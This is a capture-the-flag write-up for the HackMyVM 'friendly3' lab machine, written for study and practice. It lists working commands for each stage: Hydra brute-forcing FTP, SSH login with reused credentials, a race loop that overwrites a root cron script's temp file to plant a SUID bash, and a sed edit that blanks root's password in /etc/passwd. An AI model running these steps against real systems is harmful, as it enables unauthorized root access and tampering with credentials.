# friendly3

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| friendly3 | RiJaba1 | Beginner | HackMyVM |

**Summary:** The friendly3 machine presented an exploitation chain rooted in information disclosure, weak credentials, and an insecure root-level cron job. The web server running on port 80 exposed a plaintext message revealing a valid system username, "juan." This intelligence was immediately weaponised by running a dictionary attack against the FTP service, which yielded the password "a[REDACTED]" in under a minute. Crucially, the same credentials were reused for SSH, granting an interactive shell as the user juan. Post-exploitation enumeration uncovered a privileged scheduled task: a root-owned cron job executing `/opt/check_for_install.sh` every minute. This script fetched a bash file from the local nginx web server and piped it directly into `/tmp/a.bash` before executing it as root. Although the source file at `/var/www/html/9842734723948024.bash` was read-only, the temporary file at `/tmp/a.bash` was created anew each cycle, making it susceptible to a write race condition. By running a tight loop that continuously overwrote `/tmp/a.bash` with a SUID-implanting payload before the cron job could clean it up, a SUID-flagged copy of bash was produced at `/tmp/rootbash`. Invoking it with the `-p` flag yielded an effective UID of 0. A final `/etc/passwd` modification stripped the root password entry entirely, allowing a clean `su` escalation to a full, unrestricted root shell and enabling capture of both flags.

---

## Reconnaissance

The engagement began by identifying the target on the local network using a custom PowerShell scanning script. It returned a single VirtualBox guest at `192.168.100.157`.

```powershell
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP              MAC               Vendor
--              ---               ------
192.168.100.157 08:00:27:AE:A9:0F VirtualBox
```

With the target confirmed, a full Nmap scan was launched across all 65535 TCP ports to map the attack surface.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/friendly3]
└─$ ip=192.168.100.157 && url=http://$ip

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/friendly3]
└─$ nmap -sC -sV -p- -T4 $ip
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-10 09:01 WIB
Nmap scan report for 192.168.100.157
Host is up (0.056s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0)
| ssh-hostkey:
|   256 bc:46:3d:85:18:bf:c7:bb:14:26:9a:20:6c:d3:39:52 (ECDSA)
|_  256 7b:13:5a:46:a5:62:33:09:24:9d:3e:67:b6:eb:3f:a1 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: Welcome to nginx!
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.38 seconds
```

The scan revealed three open services: FTP (vsftpd 3.0.3) on port 21, SSH (OpenSSH 9.2p1) on port 22, and an nginx 1.22.1 web server on port 80.

---

## Initial Access

### Port 21: FTP Enumeration

The first natural step was testing anonymous FTP access, which was rejected outright.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/friendly3]
└─$ ftp $ip
Connected to 192.168.100.157.
220 (vsFTPd 3.0.3)
Name (192.168.100.157:ouba): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
ftp: Login failed
```

### Port 80: Web Server Intelligence Gathering

Curling the root of the web server returned what appeared to be a default nginx page, but embedded in the HTML body was a short message that proved far more valuable than expected.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/friendly3]
└─$ curl -i $url
HTTP/1.1 200 OK
Server: nginx/1.22.1
Date: Tue, 10 Mar 2026 02:03:31 GMT
Content-Type: text/html
Content-Length: 355
Last-Modified: Sun, 25 Jun 2023 14:58:16 GMT
Connection: keep-alive
ETag: "64985608-163"
Accept-Ranges: bytes

<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
html { color-scheme: light dark; }
body { width: 40em; margin: 0 auto;
font-family: Tahoma, Verdana, Arial, sans-serif; }
</style>
</head>
<body>
<p>Hi, sysadmin<br>I want you to know that I've just uploaded the new files into the FTP Server.<br>See you,<br>juan.</p>
</body>
</html>
```

The message was signed by a user named **juan**, who confirmed they had recently uploaded files to the FTP server. This was direct username disclosure, providing the first concrete credential component.

### FTP Brute Force

Armed with the username `juan`, Hydra was set loose against the FTP service using the rockyou wordlist.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/friendly3]
└─$ hydra -l juan -P /usr/share/wordlists/rockyou.txt ftp://$ip
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-03-10 09:05:01
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ftp://192.168.100.157:21/
[21][ftp] host: 192.168.100.157   login: juan   password: a[REDACTED]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-03-10 09:05:33
```

The password `a[REDACTED]` was recovered in roughly 32 seconds. The credentials `juan:a[REDACTED]` successfully authenticated against the FTP server.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/friendly3]
└─$ ftp $ip
Connected to 192.168.100.157.
220 (vsFTPd 3.0.3)
Name (192.168.100.157:ouba): juan
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

### SSH Credential Reuse

The FTP password was also valid for SSH, an all-too-common case of credential reuse. The exact same combination granted an interactive shell on the target.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/friendly3]
└─$ ssh juan@$ip
juan@192.168.100.157's password:
...
juan@friendly3:~$ id
uid=1001(juan) gid=1001(juan) groups=1001(juan)
juan@friendly3:~$ ls -la
total 28
drwxr-xr-x  3 juan juan 4096 Jul 17  2023 .
drwxr-xr-x  4 root root 4096 Jun 25  2023 ..
lrwxrwxrwx  1 root root    9 Jun 25  2023 .bash_history -> /dev/null
-rw-r--r--  1 juan juan  220 Apr 23  2023 .bash_logout
-rw-r--r--  1 juan juan 3526 Apr 23  2023 .bashrc
drwxr-xr-x 14 root root 4096 Jun 25  2023 ftp
-rw-r--r--  1 juan juan  807 Apr 23  2023 .profile
-r--------  1 juan juan   33 Jul 17  2023 user.txt
```

The user flag `user.txt` was readable immediately. A shell as `juan` was now established, and privilege escalation was the next objective.

---

## Privilege Escalation

### Enumerating the System: Discovering the Cron Script

Exploring the filesystem led to a notable file inside `/opt`.

```bash
juan@friendly3:/opt$ ls -la
total 12
drwxr-xr-x  2 root root 4096 Jun 25  2023 .
drwxr-xr-x 18 root root 4096 Jun 25  2023 ..
-rwxr-xr-x  1 root root  190 Jun 25  2023 check_for_install.sh

juan@friendly3:/opt$ cat check_for_install.sh
#!/bin/bash


/usr/bin/curl "http://127.0.0.1/9842734723948024.bash" > /tmp/a.bash

chmod +x /tmp/a.bash
chmod +r /tmp/a.bash
chmod +w /tmp/a.bash

/bin/bash /tmp/a.bash

rm -rf /tmp/a.bash
```

The script fetches a bash file from the local nginx server, writes it to `/tmp/a.bash`, makes it executable and writable, runs it, and then removes it. If this script executes as root on a schedule, writing into `/tmp/a.bash` in the window between creation and execution would allow arbitrary command execution as root.

### Confirming the Root Cron Job with pspy64

To verify the execution context and timing, `pspy64` was transferred from the attacker machine to the target.

```bash
# On the attacker:
┌──(ouba㉿CLIENT-DESKTOP)-[/opt]
└─$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
172.21.32.1 - - [10/Mar/2026 09:33:46] "GET /pspy64 HTTP/1.1" 200 -
```

```bash
# On the target:
juan@friendly3:/tmp$ curl http://192.168.100.1:8080/pspy64 -o /tmp/pspy64
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 3032k  100 3032k    0     0  25.7M      0 --:--:-- --:--:-- --:--:-- 25.7M
juan@friendly3:/tmp$ chmod +x pspy64
```

Running pspy64 captured the following process events at the top of the next minute.

```bash
2026/03/09 22:35:01 CMD: UID=0     PID=1765   | /usr/sbin/CRON -f
2026/03/09 22:35:01 CMD: UID=0     PID=1767   | /bin/sh -c /opt/check_for_install.sh
2026/03/09 22:35:01 CMD: UID=0     PID=1768   | /bin/bash /opt/check_for_install.sh
2026/03/09 22:35:01 CMD: UID=0     PID=1769   | /usr/bin/curl http://127.0.0.1/9842734723948024.bash
2026/03/09 22:35:01 CMD: UID=0     PID=1770   | /bin/bash /opt/check_for_install.sh
2026/03/09 22:35:01 CMD: UID=0     PID=1771   | chmod +r /tmp/a.bash
2026/03/09 22:35:01 CMD: UID=0     PID=1772   | /bin/bash /opt/check_for_install.sh
2026/03/09 22:35:01 CMD: UID=0     PID=1773   | /bin/bash /tmp/a.bash
2026/03/09 22:35:01 CMD: UID=0     PID=1774   | /bin/bash /opt/check_for_install.sh
```

This confirmed every suspicion: **UID=0** (root) was the executing context. The script runs every minute via cron, downloads the bash file, then executes `/tmp/a.bash` as root.

### Inspecting the Web Root

Checking the nginx web root revealed that the source file was nearly empty and read-only, but that was irrelevant given the identified race window.

```bash
juan@friendly3:/tmp$ ls -la /var/www/html/
total 16
drwxr-xr-x 2 root root 4096 Jun 25  2023 .
drwxr-xr-x 3 root root 4096 Jun 25  2023 ..
-rw-r--r-- 1 root root    6 Jun 25  2023 9842734723948024.bash
-rw-r--r-- 1 root root  355 Jun 25  2023 index.html

juan@friendly3:/tmp$ cat /var/www/html/9842734723948024.bash
#test
```

The source file simply contained a comment. The real opportunity was the `/tmp/a.bash` write race.

### Exploiting the Race Condition

The attack relied on the fact that the cron script writes `/tmp/a.bash` with world-write permissions (`chmod +w`) before executing it. By running a tight loop that perpetually overwrites `/tmp/a.bash` with a malicious payload, the contents would eventually be read by the root bash process during execution.

The payload copies the system bash binary to `/tmp/rootbash` and sets the SUID and SGID bits on it.

```bash
juan@friendly3:/tmp$ while true; do echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" > /tmp/a.bash 2>/dev/null; [ -f /tmp/rootbash ] && break; done
```

The loop ran until the SUID binary appeared, confirming successful exploitation.

```bash
juan@friendly3:/tmp$ ls -la /tmp/rootbash
-rwsr-sr-x 1 root root 1265648 Mar  9 22:39 /tmp/rootbash
```

### Obtaining an Effective Root Shell

Invoking the SUID bash with the `-p` flag (which preserves the effective UID rather than dropping privileges) produced a shell running with `euid=0`.

```bash
juan@friendly3:/tmp$ /tmp/rootbash -p
rootbash-5.2# id
uid=1001(juan) gid=1001(juan) euid=0(root) egid=0(root) groups=0(root),1001(juan)
```

### Full Root Escalation via /etc/passwd Modification

Using the effective root privileges, the password field for the root account in `/etc/passwd` was stripped, effectively removing the requirement for a password on `su` invocations.

```bash
rootbash-5.2# sed -i 's/^root:x:/root::/' /etc/passwd
rootbash-5.2# su - root
root@friendly3:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
friendly3
```

### Capturing the Flags

With a full root shell established, both flags were read in a single command.

```bash
root@friendly3:~# cat /home/juan/user.txt /root/root.txt
cb4[REDACTED]
eb9[REDACTED]
```

---

## Attack Chain Summary

1. **Reconnaissance**: A network sweep identified the target at `192.168.100.157`. An Nmap full-port scan exposed three services: FTP (vsftpd 3.0.3), SSH (OpenSSH 9.2p1), and HTTP (nginx 1.22.1).

2. **Vulnerability Discovery**: The nginx landing page contained a plaintext message signed by the user "juan," leaking a valid system username. Anonymous FTP was disabled, but the username leak made the service a viable brute-force target.

3. **Exploitation**: Hydra recovered the FTP password `a[REDACTED]` for the user `juan` in under a minute. The identical credentials were accepted by the SSH service, granting an interactive low-privilege shell.

4. **Internal Enumeration**: Filesystem exploration revealed `/opt/check_for_install.sh`, a root-owned script that fetched and executed a bash file from localhost via curl into `/tmp/a.bash`. `pspy64` confirmed a root-level cron job executing this script every minute, and that `/tmp/a.bash` was granted world-write permissions before execution.

5. **Privilege Escalation**: A write race condition was exploited by spinning a tight loop that continuously overwrote `/tmp/a.bash` with a SUID-implanting payload. Root cron executed the tampered file and produced a SUID bash at `/tmp/rootbash`. Invoking it with `-p` yielded `euid=0`, after which `/etc/passwd` was modified to remove the root password, completing a full `su` escalation to an unrestricted root shell.
